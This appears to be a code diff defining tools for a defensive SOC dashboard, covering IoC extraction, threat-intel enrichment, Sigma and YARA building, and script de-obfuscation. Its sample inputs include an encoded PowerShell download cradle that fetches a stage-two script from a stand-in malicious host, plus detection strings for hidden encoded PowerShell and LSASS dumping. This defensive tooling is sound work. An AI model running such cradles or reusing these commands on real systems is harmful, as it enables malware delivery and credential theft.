@@ -1,85 +1,107 @@
-/* Privacy Skill Vault — SOC & Security Tools Dashboard (Exact Match to Reference UI) */
+/* Privacy Skill Vault — Royal Blue Hiderox-Architecture SOC & Security Tools Suite */
 (function () {
   "use strict";
 
   const CATEGORIES = [
-    { id: "all", label: "All Tools", icon: "grid" },
-    { id: "soc", label: "SOC & Detection", icon: "shield" },
-    { id: "ti", label: "Threat Intelligence", icon: "globe" },
-    { id: "dfir", label: "DFIR & Forensics", icon: "file" },
-    { id: "network", label: "Network & Email", icon: "network" },
-    { id: "util", label: "Decoders & Governance", icon: "terminal" }
+    { id: "all", label: "All Tools" },
+    { id: "soc", label: "SOC & Detection" },
+    { id: "ti", label: "Threat Intelligence" },
+    { id: "dfir", label: "DFIR & Forensics" },
+    { id: "network", label: "Network & Email" },
+    { id: "util", label: "Governance & Utilities" }
   ];
-
-  const ICONS = {
-    grid: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/></svg>`,
-    shield: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>`,
-    globe: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>`,
-    file: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><circle cx="11.5" cy="14.5" r="2.5"/><line x1="13.5" y1="16.5" x2="15.5" y2="18.5"/></svg>`,
-    network: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><polyline points="6 10 9 10 11 7 13 13 15 10 18 10"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>`,
-    terminal: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>`,
-    code: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="16" rx="2"/><polyline points="8 10 6 12 8 14"/><polyline points="16 10 18 12 16 14"/><line x1="13" y1="9" x2="11" y2="15"/></svg>`,
-    bug: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="6"/><line x1="12" y1="2" x2="12" y2="6"/><line x1="12" y1="18" x2="12" y2="22"/><line x1="4.93" y1="4.93" x2="7.76" y2="7.76"/><line x1="16.24" y1="16.24" x2="19.07" y2="19.07"/><line x1="2" y1="12" x2="6" y2="12"/><line x1="18" y1="12" x2="22" y2="12"/></svg>`,
-    nodes: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="6" cy="6" r="3"/><circle cx="18" cy="6" r="3"/><circle cx="12" cy="18" r="3"/><line x1="8.5" y1="7.5" x2="10.5" y2="15.5"/><line x1="15.5" y1="7.5" x2="13.5" y2="15.5"/></svg>`,
-    lock: `<svg viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>`
-  };
 
   const TOOLS = [
     {
       id: "ioc",
       cat: "ti",
-      icon: "nodes",
+      badge: "IOC",
       title: "Bulk IoC Extractor & Defanger",
-      desc: "Extract IPs, domains, URLs, emails, CVEs and file hashes from raw logs and defang indicators safely.",
+      desc: "Extract IPv4s, domains, URLs, emails, CVEs, and SHA-256/MD5 hashes from raw logs and defang indicators safely.",
       tags: ["Threat Intel", "IOC", "Defang", "Parser"],
-      features: ["Extracts IPv4, Domains, URLs, Emails, SHA256, MD5 & CVEs", "Automatic safe defanging (hxxps / [.])", "Deduplicates noisy firewall and proxy logs", "Works 100% locally in your browser"],
-      sampleName: "Sample: Phishing & C2 Proxy Log",
-      sampleQuery: 'source="proxy.log" | action="extract_ioc" | defang=true',
+      options: ["Defang Output (hxxps / [.])", "Extract Raw Values"],
+      actionLabel: "Extract Indicators",
       sample: `2026-10-17 10:14:23 WKSTN-FIN-09 src=10.24.18.44 dst=185.220.101.42 url=https://login-gateway.evil-pay-verify.com/stage2/payload.ps1 user=admin
 2026-10-17 10:15:07 SRV-DC01 src=10.10.0.5 dst=45.155.205.233 sender=urgent-alert@sec-account-verify.org cve=CVE-2024-21412
-2026-10-17 10:16:11 WKSTN-HR-02 sha256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 md5=44d88612fea8a8f36de82e1278abb02f`
+2026-10-17 10:16:11 WKSTN-HR-02 sha256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 md5=44d88612fea8a8f36de82e1278abb02f`,
+      whatItDoes: "Automatically parses unstructured firewall logs, phishing emails, threat reports, and SIEM exports to extract and deduplicate IPv4 addresses, URLs, domains, email addresses, file hashes (MD5, SHA-1, SHA-256), and CVE identifiers.",
+      whyItMatters: "During active incident triage, manually copying indicators from raw logs is slow and error-prone. Accidental clicks on live malicious links inside ticketing systems can expose analyst workstations.",
+      howItWorks: "Uses client-side regular expression engines to scan input text in memory, deduplicating matches into categorized lists and optionally converting periods and schemes into inert defanged notation (hxxps[://]domain[.]com).",
+      bestPractices: [
+        "Always defang URLs and domains before pasting indicators into Jira, ServiceNow, Slack, or executive email reports.",
+        "Filter out internal RFC1918 private IPs (10.x.x.x, 192.168.x.x) before querying external threat intelligence feeds.",
+        "Cross-check extracted SHA-256 hashes in the Multi-Source Threat Intel Hub."
+      ],
+      faqs: [
+        { q: "Does any pasted log data leave my browser?", a: "No. Extraction and defanging run 100% locally in your browser's JavaScript engine. Zero bytes are transmitted over the network." },
+        { q: "Why should I defang indicators?", a: "Defanging prevents email clients and ticketing systems from turning malicious URLs into clickable hyperlinks that someone might accidentally trigger." }
+      ],
+      related: ["ti", "headers", "regex", "deobfuscator"]
     },
     {
       id: "ti",
       cat: "ti",
-      icon: "globe",
+      badge: "INT",
       title: "Multi-Source Threat Intel Hub",
-      desc: "Enrich IPs, domains, URLs and file hashes with live Shodan InternetDB, RDAP, DNS and reputation sources.",
-      tags: ["Threat Intel", "IOC", "Enrichment", "Reputation"],
-      features: ["Live Shodan InternetDB open ports & CVE lookup", "Live RDAP ASN, CIDR and registrar ownership", "Cloudflare DoH DNS record resolution", "One-click pivot to VirusTotal, AbuseIPDB & URLScan"],
-      sampleName: "Sample: Public Resolver / Target IP",
-      sampleQuery: 'indicator="1.1.1.1" | modules="shodan,rdap,dns,reputation"',
-      sample: "1.1.1.1"
+      desc: "Enrich IPs and domains in real time using keyless Shodan InternetDB, RDAP ownership, Cloudflare DoH DNS, and OSINT pivots.",
+      tags: ["Threat Intel", "Shodan", "RDAP", "DNS"],
+      options: ["Full Live Enrichment", "Quick OSINT Pivot Links"],
+      actionLabel: "Enrich Indicator",
+      sample: "1.1.1.1",
+      whatItDoes: "Consolidates live indicator enrichment into a single view—querying Shodan InternetDB for open ports and CVEs, RDAP for ASN/registrar ownership, and Cloudflare DNS-over-HTTPS for live DNS records, alongside instant deep-links to VirusTotal, AbuseIPDB, and URLScan.",
+      whyItMatters: "SOC analysts often waste minutes opening ten separate tabs for every suspicious IP or domain. Aggregating open ports, vulnerabilities, registration data, and DNS resolution accelerates triage.",
+      howItWorks: "Executes direct browser HTTPS requests to CORS-enabled public security APIs (internetdb.shodan.io, rdap.org, and cloudflare-dns.com) and formats the JSON responses into a unified report card.",
+      bestPractices: [
+        "Check open ports and CVEs on external IPs before escalating perimeter scan alerts.",
+        "Inspect RDAP registration dates—newly registered domains (< 30 days) are high-confidence phishing indicators.",
+        "Use the direct VirusTotal and AbuseIPDB pivot links for historical passive DNS and community abuse reports."
+      ],
+      faqs: [
+        { q: "Do I need an API key for Shodan InternetDB or RDAP?", a: "No. Shodan InternetDB, ICANN RDAP, and Cloudflare DoH are keyless public endpoints that run directly from your browser." },
+        { q: "Why do external links open in a new tab?", a: "Providers like VirusTotal and AbuseIPDB block unauthenticated browser CORS requests, so direct deep-links let you view their full web reports in one click." }
+      ],
+      related: ["ioc", "headers", "cvss", "events"]
     },
     {
       id: "headers",
       cat: "network",
-      icon: "code",
+      badge: "EML",
       title: "Email Header Analyzer",
-      desc: "Inspect and analyze raw SMTP routing headers, hop delays, and SPF/DKIM/DMARC authentication signals.",
-      tags: ["Email Security", "Phishing", "Headers", "DMARC"],
-      features: ["Chronological SMTP hop-by-hop trace table", "SPF, DKIM, and DMARC alignment verification", "Detects Reply-To vs From spoofing anomalies", "Extracts X-Originating-IP automatically"],
-      sampleName: "Sample: Spoofed Phishing Email Header",
-      sampleQuery: 'header="SMTP" | verify="spf,dkim,dmarc" | detect="reply_to_mismatch"',
+      desc: "Parse raw SMTP email headers to trace hop-by-hop routing delays, originating IPs, and SPF/DKIM/DMARC alignment.",
+      tags: ["Phishing", "SMTP", "DMARC", "Email Security"],
+      options: ["Full Hop & Auth Analysis", "Extract Routing IPs Only"],
+      actionLabel: "Analyze Email Headers",
       sample: `Return-Path: <security-notice@paypa1-support-alert.com>
 Received: from mail.internal-gateway.local (10.10.2.15) by mx.enterprise.org with ESMTPS id 991A2B; Sat, 17 Oct 2026 14:22:45 +0000
 Received: from relay-out.bulletproof-host.net ([185.193.125.44]) by mail.internal-gateway.local with ESMTP; Sat, 17 Oct 2026 14:22:11 +0000
+Received: from workstation-win10 ([91.215.85.19]) by relay-out.bulletproof-host.net with SMTP; Sat, 17 Oct 2026 14:15:02 +0000
 From: "Corporate Helpdesk" <admin@enterprise.org>
 Reply-To: <collect-credentials@paypa1-support-alert.com>
 Subject: URGENT: Mandatory MFA Token Re-synchronization Required
 X-Originating-IP: [91.215.85.19]
-Authentication-Results: mx.enterprise.org; spf=fail smtp.mailfrom=paypa1-support-alert.com; dkim=fail; dmarc=fail action=quarantine`
+Authentication-Results: mx.enterprise.org; spf=fail smtp.mailfrom=paypa1-support-alert.com; dkim=fail; dmarc=fail action=quarantine`,
+      whatItDoes: "Reconstructs the chronological delivery path of an email from bottom-to-top Received headers, extracts sender envelope mismatches, and highlights SPF, DKIM, and DMARC authentication results.",
+      whyItMatters: "Display names and From headers are trivially spoofed in phishing attacks. True attribution requires inspecting the bottom-most external Received hop, Return-Path, and Authentication-Results headers.",
+      howItWorks: "Parses multiline RFC 5322 header blocks locally, reverses the Received stack into chronological Hop 1 → Final Hop order, and flags Reply-To/From domain discrepancies.",
+      bestPractices: [
+        "Always trust the Authentication-Results header stamped by your own receiving mail gateway (top-most hop).",
+        "Look for mismatches between the header From domain, the Return-Path (Envelope Sender), and the Reply-To address.",
+        "Pivot on the X-Originating-IP or first external Received IP in the Threat Intel Hub."
+      ],
+      faqs: [
+        { q: "Why are Received headers read from bottom to top?", a: "Each mail server prepends its Received line to the top of the header block as the message transits, so the bottom-most Received line represents the earliest hop." }
+      ],
+      related: ["ioc", "ti", "deobfuscator", "report"]
     },
     {
       id: "sigma",
       cat: "soc",
-      icon: "shield",
-      title: "Sigma Rule Validator & Translator",
-      desc: "Validate Sigma rules, check YAML syntax and translate detections into Elastic KQL, Splunk SPL & Sentinel.",
-      tags: ["Detection", "Sigma", "Rule Engineering", "Blue Team"],
-      features: ["Translates Sigma YAML to Elastic KQL, Splunk SPL & Sentinel KQL", "Supports selection, filter and string modifiers", "Maps standard Sigma fields to ECS & CIM schemas", "Pre-loaded with high-severity SOC detection templates"],
-      sampleName: "Sample: LSASS Memory Dump via Comsvcs.dll",
-      sampleQuery: 'sigma_rule="lsass_comsvcs_dump.yml" | target="elastic,splunk,sentinel"',
+      badge: "SGM",
+      title: "SIEM Query Builder & Sigma Translator",
+      desc: "Validate YAML Sigma detection rules and dynamically translate selection/filter logic into Elastic KQL, Splunk SPL, and Sentinel KQL.",
+      tags: ["Sigma", "SIEM", "Elastic KQL", "Splunk SPL"],
+      options: ["All SIEM Backends", "Elastic KQL", "Splunk SPL", "Sentinel KQL"],
+      actionLabel: "Translate Sigma Rule",
       sample: `title: Suspicious LSASS Memory Dump via Comsvcs.dll
 id: a1b2c3d4-9912-4e11-8821-ff0011223344
 status: production
@@ -95,156 +117,274 @@ detection:
   filter:
     User|contains: 'AUTHORITY\\SYSTEM'
   condition: selection and not filter
-level: critical`
+level: critical`,
+      whatItDoes: "Parses Sigma YAML detection rules—including field modifiers (|contains, |startswith, |endswith, |all) and filter exclusions—and translates them into ready-to-run queries for Elastic/Kibana, Splunk, and Microsoft Sentinel.",
+      whyItMatters: "Detection engineers maintain vendor-agnostic detections in Sigma YAML. Manually rewriting complex boolean conditions for three different SIEM query languages introduces syntax bugs.",
+      howItWorks: "Extracts selection and filter key-value blocks from the YAML detection section, maps Windows/Sysmon field names to ECS, CIM, and Sentinel schemas, and compiles boolean queries dynamically.",
+      bestPractices: [
+        "Test translated queries against 7–30 days of historical telemetry before enabling production alerting.",
+        "Add environment-specific service account or path exclusions inside a dedicated filter block.",
+        "Include the MITRE ATT&CK technique ID and false-positive notes in every rule."
+      ],
+      faqs: [
+        { q: "Does this translator dynamically parse my custom YAML fields?", a: "Yes. Any field or string list you add under selection: or filter: is dynamically parsed and mapped into Elastic KQL, Splunk SPL, and Sentinel KQL." }
+      ],
+      related: ["events", "regex", "yara", "json"]
     },
     {
       id: "events",
       cat: "soc",
-      icon: "file",
+      badge: "EVT",
       title: "Windows & Sysmon Event Encyclopedia",
-      desc: "Search Windows Security and Sysmon Event IDs with XML field schemas, MITRE ATT&CK tags and hunting queries.",
-      tags: ["SOC", "Windows Events", "Sysmon", "Hunting"],
-      features: ["Covers critical Windows Security & Sysmon IDs (4624, 4625, 4688, ID 1, 3, 10, 22)", "Includes LogonType & failure SubStatus reference", "Ready-to-run Elastic KQL hunting queries", "False-positive tuning guidance for production SIEMs"],
-      sampleName: "Sample: Kerberos & Logon Events",
-      sampleQuery: 'search="4624" | source="Windows Security, Sysmon"',
-      sample: "4624"
+      desc: "Search 30+ high-value Windows Security and Sysmon Event IDs with XML field schemas, MITRE ATT&CK mappings, and KQL hunts.",
+      tags: ["Windows Security", "Sysmon", "Event ID", "Threat Hunting"],
+      options: ["All Sources", "Windows Security Only", "Sysmon Only"],
+      actionLabel: "Search Event IDs",
+      sample: "4624",
+      whatItDoes: "Provides an instant-search reference for critical Windows Security (4624, 4625, 4688, 4697, 4698, 4720, 4769, 1102) and Sysmon (IDs 1–29) events, detailing XML fields, LogonTypes, MITRE ATT&CK techniques, and KQL hunting queries.",
+      whyItMatters: "Memorizing Windows event schemas, hexadecimal failure codes (0xC000006A), and Sysmon GrantedAccess masks (0x1010) is difficult during high-pressure investigations.",
+      howItWorks: "Filters an embedded forensic dataset by Event ID, keyword (e.g., 'lsass', 'kerberos', 'rdp', 'service'), or MITRE technique ID.",
+      bestPractices: [
+        "Correlate Event ID 4624 (LogonType 3 or 10) with Event ID 4672 to track privileged lateral movement.",
+        "Enable command-line auditing via GPO so Event ID 4688 captures full process arguments.",
+        "Pair Sysmon Event ID 1 (Process Create) with Event ID 3 (Network Connect) and Event ID 22 (DNS Query)."
+      ],
+      faqs: [
+        { q: "Can I search by keyword as well as Event ID number?", a: "Yes. Enter an ID like '4624' or '10', or type keywords like 'kerberos', 'lsass', 'powershell', or 'T1003'. Leave the input as 'ALL' to browse the entire encyclopedia." }
+      ],
+      related: ["sigma", "json", "regex", "report"]
     },
     {
       id: "regex",
       cat: "soc",
-      icon: "file",
+      badge: "RGX",
       title: "Log Analyzer & Regex Sandbox",
-      desc: "Analyze and search security logs quickly with named regex capture groups, field filters and structured table view.",
-      tags: ["SOC", "Log Analysis", "Detection", "Parser"],
-      features: ["Supports common log formats (CEF, Syslog, Auth, JSON)", "Named regex capture group extraction table", "Field-based highlighting and filtering", "Works completely in your browser"],
-      sampleName: "Sample: Failed Login Attempts (Auth / CEF Log)",
-      sampleQuery: 'source=auth.log | level=ERROR | message="Failed password"',
-      sample: `PATTERN::(?<time>\\d{4}-\\d{2}-\\d{2}\\s+[\\d:]+)\\s+(?<host>\\S+)\\s+sshd\\[\\d+\\]:\\s+(?<message>Failed password for (?:invalid user )?(?<user>\\S+) from (?<src_ip>\\d+\\.\\d+\\.\\d+\\.\\d+))
+      desc: "Test custom regular expressions and named capture groups (?<name>...) against multi-line security logs in real time.",
+      tags: ["Log Analysis", "Regex", "Grok", "Parser"],
+      options: ["Named Capture Table", "Highlighted Raw Matches"],
+      actionLabel: "Run Regex Extraction",
+      sample: `PATTERN::(?<time>\\d{4}-\\d{2}-\\d{2}\\s+[\\d:]+)\\s+(?<host>\\S+)\\s+sshd\\[\\d+\\]:\\s+Failed password for (?:invalid user )?(?<user>\\S+) from (?<src_ip>\\d+\\.\\d+\\.\\d+\\.\\d+)
 LOG::2026-10-16 10:14:23 server01 sshd[2190]: Failed password for invalid user root from 203.0.113.45 port 51234 ssh2
 2026-10-16 10:15:07 server01 sshd[2194]: Failed password for admin from 198.51.100.23 port 49112 ssh2
 2026-10-16 10:16:11 server02 sshd[8812]: Failed password for invalid user oracle from 192.0.2.10 port 38291 ssh2
-2026-10-16 10:18:45 server01 sshd[2209]: Failed password for saju from 203.0.113.77 port 55100 ssh2
-2026-10-16 10:19:02 server03 sshd[4410]: Failed password for invalid user ubuntu from 198.51.100.88 port 41009 ssh2`
+2026-10-16 10:18:45 server01 sshd[2209]: Failed password for saju from 203.0.113.77 port 55100 ssh2`,
+      whatItDoes: "Compiles your custom JavaScript/PCRE regular expression against raw log lines and dynamically builds a structured table from your named capture groups (?<field>...) or numbered groups.",
+      whyItMatters: "Writing custom SIEM parsers, Logstash Grok patterns, or regex field extractors without live capture-group feedback often leads to catastrophic backtracking or missed log variants.",
+      howItWorks: "Splits the input into PATTERN:: and LOG:: sections, executes RegExp.matchAll() across all lines, and dynamically generates table columns matching whatever named groups you defined.",
+      bestPractices: [
+        "Use named capture groups like (?<src_ip>...) so extracted fields map cleanly to SIEM column headers.",
+        "Avoid greedy .* wildcards when matching delimited logs; use negated character classes like [^|]+ instead.",
+        "Test against both valid and malformed log lines to verify parser resilience."
+      ],
+      faqs: [
+        { q: "How do I test my own regex pattern?", a: "Put your regex after PATTERN:: on the first line, and paste your raw logs after LOG:: on the following lines. The table columns update automatically to match your capture groups." }
+      ],
+      related: ["ioc", "sigma", "json", "events"]
     },
     {
       id: "yara",
       cat: "dfir",
-      icon: "shield",
-      title: "YARA Rule Builder & Linter",
-      desc: "Generate structured YARA rules with PE header checks, hex wildcards, and live syntax validation.",
-      tags: ["DFIR", "Malware", "YARA", "Detection"],
-      features: ["Validates rule identifiers, strings and condition blocks", "Includes MZ/PE header and filesize presets", "Supports ASCII, wide, nocase and fullword modifiers", "Instant copyable .yar output"],
-      sampleName: "Sample: CobaltStrike Beacon Loader Rule",
-      sampleQuery: 'rule="Detect_CobaltStrike_Beacon" | check="uint16(0) == 0x5A4D"',
+      badge: "YAR",
+      title: "YARA Rule Builder & Syntax Linter",
+      desc: "Build complete YARA rules with custom strings, hex wildcards, PE header checks, and live unreferenced-string linting.",
+      tags: ["YARA", "Malware Analysis", "DFIR", "Threat Hunting"],
+      options: ["Compile & Lint Rule", "PE Binary Template"],
+      actionLabel: "Build & Validate YARA",
       sample: `RULE_NAME::Detect_CobaltStrike_Beacon_Loader
 META_AUTHOR::SOC Detection Engineering
 META_SEVERITY::Critical
 STRINGS::
 $s1 = "powershell.exe -nop -w hidden -enc" ascii wide nocase
 $s2 = "ReflectiveLoader" ascii fullword
+$s3 = "VirtualAllocEx" ascii
 $hex1 = { 4D 5A 90 00 03 00 00 00 [4-16] 50 45 00 00 }
-CONDITION::uint16(0) == 0x5A4D and filesize < 5MB and ($hex1 or all of ($s*))`
+CONDITION::uint16(0) == 0x5A4D and filesize < 5MB and ($hex1 or 2 of ($s*))`,
+      whatItDoes: "Compiles structured metadata, string definitions, and condition logic into a properly formatted YARA rule while checking for syntax errors, unbalanced quotes/hex braces, and unreferenced string variables.",
+      whyItMatters: "Syntax typos or forgetting to reference a defined string in the condition block will cause YARA scanners and EDR hunting jobs to reject the rule.",
+      howItWorks: "Parses your custom STRINGS:: and CONDITION:: blocks, validates every $variable against the condition expression, and outputs the complete .yar file.",
+      bestPractices: [
+        "Filter by uint16(0) == 0x5A4D and filesize < 10MB first in your condition to dramatically speed up scanning.",
+        "Combine unique strings with fullword and wide modifiers to catch UTF-16 compiled .NET/Windows binaries."
+      ],
+      faqs: [
+        { q: "Does this include my custom strings in the generated output?", a: "Yes. Every string and hex pattern you list under STRINGS:: is validated and included in the compiled YARA output." }
+      ],
+      related: ["deobfuscator", "sigma", "ioc", "report"]
     },
     {
       id: "deobfuscator",
       cat: "dfir",
-      icon: "terminal",
-      title: "Safe Script De-obfuscator",
-      desc: "Decode obfuscated PowerShell -EncodedCommand (UTF-16LE), Base64, Hex and URL strings without executing code.",
-      tags: ["DFIR", "Deobfuscation", "PowerShell", "Malware"],
-      features: ["Decodes UTF-16LE PowerShell -EncodedCommand payloads", "Extracts embedded C2 URLs and staging domains", "Flags dangerous functions (IEX, DownloadString, VirtualAlloc)", "Zero script execution risk"],
-      sampleName: "Sample: Encoded PowerShell Download Cradle",
-      sampleQuery: 'input="powershell -enc ..." | encoding="utf16le_base64"',
-      sample: `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBtAGEAbAB3AGEAcgBlAC0AYwAyAC4AZQB2AGkAbAAuAG8AcgBnAC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkA`
+      badge: "DEC",
+      title: "Safe Script & Payload De-obfuscator",
+      desc: "Safely decode UTF-16LE PowerShell -EncodedCommand, Base64, Hex, and URL-encoded scripts without executing code.",
+      tags: ["Deobfuscator", "PowerShell", "Base64", "Malware"],
+      options: ["Auto-Detect & Decode", "UTF-16LE PowerShell", "Standard Base64 / URL"],
+      actionLabel: "De-obfuscate Payload",
+      sample: `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBtAGEAbAB3AGEAcgBlAC0AYwAyAC4AZQB2AGkAbAAuAG8AcgBnAC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkA`,
+      whatItDoes: "Decodes obfuscated command lines—including Windows PowerShell UTF-16LE Base64 (-enc), standard Base64, hexadecimal byte strings, and URL encoding—while flagging high-risk API calls and extracting hidden URLs.",
+      whyItMatters: "Attackers routinely encode PowerShell download cradles and living-off-the-land commands to bypass static signatures and hide C2 domains from junior analysts.",
+      howItWorks: "Strips null bytes from UTF-16LE Base64 payloads entirely in memory as inert text strings, never invoking eval() or any shell interpreter.",
+      bestPractices: [
+        "Never run unknown encoded scripts in a live terminal to see what they do; always decode them as inert text.",
+        "Copy any URLs or IPs revealed in the decoded payload directly into the Bulk IoC Extractor to defang them."
+      ],
+      faqs: [
+        { q: "Why does standard Base64 decoding produce spaces or null bytes on PowerShell commands?", a: "PowerShell's -EncodedCommand uses UTF-16LE (2 bytes per ASCII character). Our decoder automatically strips interleaved null bytes so the script reads cleanly." }
+      ],
+      related: ["ioc", "yara", "sigma", "events"]
     },
     {
       id: "json",
       cat: "dfir",
-      icon: "code",
+      badge: "JSN",
       title: "JSON Log & Alert Beautifier",
-      desc: "Validate, pretty-print, and flatten nested Elastic ECS, Sysmon, and AWS CloudTrail JSON logs locally.",
-      tags: ["Log Analysis", "JSON", "ECS", "SIEM"],
-      features: ["Pretty-prints minified single-line SIEM JSON alerts", "Extracts key-value summary table for rapid triage", "Validates JSON syntax and highlights errors", "100% client-side processing"],
-      sampleName: "Sample: Elastic Sysmon Process Creation Alert",
-      sampleQuery: 'format="json" | schema="ecs" | action="beautify"',
-      sample: `{"@timestamp":"2026-10-17T15:04:22.419Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"SRV-DC01.corp.local","ip":"10.10.0.5"},"process":{"pid":6412,"executable":"C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe","command_line":"wmic process call create powershell.exe"},"user":{"name":"svc_backup"},"threat":{"tactic":"Execution","technique":"T1047"}}`
+      desc: "Validate, pretty-print, and flatten nested Elastic ECS, Sysmon, and AWS CloudTrail JSON logs into readable dot-notation fields.",
+      tags: ["JSON", "ECS", "CloudTrail", "Log Formatter"],
+      options: ["Pretty JSON + Flattened Key Table", "Pretty JSON Only"],
+      actionLabel: "Format & Flatten JSON",
+      sample: `{"@timestamp":"2026-10-17T15:04:22.419Z","event":{"code":"1","provider":"Microsoft-Windows-Sysmon"},"host":{"name":"SRV-DC01.corp.local","ip":"10.10.0.5"},"process":{"pid":6412,"executable":"C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe","command_line":"wmic process call create powershell.exe"},"user":{"name":"svc_backup"},"threat":{"tactic":"Execution","technique":"T1047"}}`,
+      whatItDoes: "Formats single-line minified JSON logs into indented blocks AND generates a flattened dot-notation key-value table (e.g., process.executable, host.name) for quick SIEM field lookups.",
+      whyItMatters: "Raw EDR, CloudTrail, and SIEM webhook alerts arrive as crushed single-line JSON strings that are nearly impossible to read or write KQL field queries against without flattening.",
+      howItWorks: "Parses the JSON tree locally in JavaScript, recursively traverses nested objects/arrays to build dot-notation paths, and outputs both the formatted tree and field table.",
+      bestPractices: [
+        "Use the flattened dot-notation field names directly when building Elastic KQL or Sentinel queries.",
+        "Sanitize customer PII if sharing formatted JSON snippets in public forums."
+      ],
+      faqs: [
+        { q: "What happens if my JSON log has a syntax error?", a: "The parser highlights the exact character position and reason for the JSON syntax failure." }
+      ],
+      related: ["regex", "sigma", "timestamp", "events"]
     },
     {
       id: "timestamp",
       cat: "util",
-      icon: "terminal",
-      title: "Multi-Timezone Timestamp Converter",
-      desc: "Convert Unix Epoch (s/ms), Windows FileTime/LDAP 18-digit timestamps and ISO-8601 strings across timezones.",
-      tags: ["DFIR", "Forensics", "Timestamps", "Utilities"],
-      features: ["Supports Unix Epoch seconds & milliseconds", "Converts 18-digit Windows Active Directory FileTime", "Outputs UTC, Local Analyst Time, and ISO-8601", "Essential for multi-source timeline reconstruction"],
-      sampleName: "Sample: Forensic Epoch Timestamp",
-      sampleQuery: 'epoch=1760713462 | convert="utc,local,filetime"',
-      sample: "1760713462"
+      badge: "TIME",
+      title: "Multi-Timezone Forensic Timestamp Converter",
+      desc: "Convert Unix Epoch (seconds, ms, ns), 18-digit Windows FileTime/LDAP timestamps, and ISO-8601 strings across timezones.",
+      tags: ["Forensics", "Timestamps", "Epoch", "FileTime"],
+      options: ["Convert Input Timestamp", "Use Current Live UTC Time"],
+      actionLabel: "Convert Timestamp",
+      sample: "1760713462",
+      whatItDoes: "Converts between Unix Epoch (10-digit seconds, 13-digit milliseconds), 18-digit Windows Active Directory / NTFS FileTime intervals, and ISO-8601 strings, displaying UTC, Local Time, and relative offsets.",
+      whyItMatters: "During incident timeline reconstruction, firewall logs may be in UTC Epoch, Active Directory attributes (lastLogonTimestamp) in 18-digit FileTime, and endpoint logs in local time.",
+      howItWorks: "Detects timestamp precision automatically by digit length and format, applying BigInt arithmetic for 100-nanosecond Windows FileTime epochs (since January 1, 1601).",
+      bestPractices: [
+        "Always normalize every timestamp in an incident timeline to UTC before correlating events across hosts.",
+        "Remember that Windows Active Directory lastLogonTimestamp is stored as an 18-digit FileTime integer."
+      ],
+      faqs: [
+        { q: "How do I convert an 18-digit Windows AD lastLogon value?", a: "Simply paste any 18-digit integer (such as 134051966620000000) into the input box; the tool automatically detects Windows FileTime format." }
+      ],
+      related: ["json", "report", "events", "headers"]
     },
     {
       id: "severity",
       cat: "util",
-      icon: "shield",
-      title: "Incident Severity Calculator",
-      desc: "Calculate transparent SOC incident priority (P1–P4), SLA response windows and immediate containment steps.",
-      tags: ["IR", "Triage", "SLA", "Governance"],
-      features: ["Scores Asset Criticality, Data Sensitivity & Scope", "Outputs P1–P4 Priority Rating and numeric risk score", "Generates immediate containment checklist", "Standardizes analyst escalation decisions"],
-      sampleName: "Sample: Domain Controller Lateral Movement",
-      sampleQuery: 'asset="tier1_dc" | scope="multi_host_lateral" | data="regulated_pii"',
+      badge: "SEV",
+      title: "Incident Severity & SLA Calculator",
+      desc: "Calculate transparent SOC incident priority (P1–P4), numeric risk scores, SLA response windows, and containment playbooks.",
+      tags: ["Incident Response", "Triage", "SLA", "Governance"],
+      options: ["Calculate Priority & Playbook", "Export Triage Matrix"],
+      actionLabel: "Calculate Incident Severity",
       sample: `ASSET_CRITICALITY::tier1_dc
 DATA_SENSITIVITY::regulated_pii
 COMPROMISE_SCOPE::multi_host_lateral
-THREAT_STATUS::active_c2_exfil`
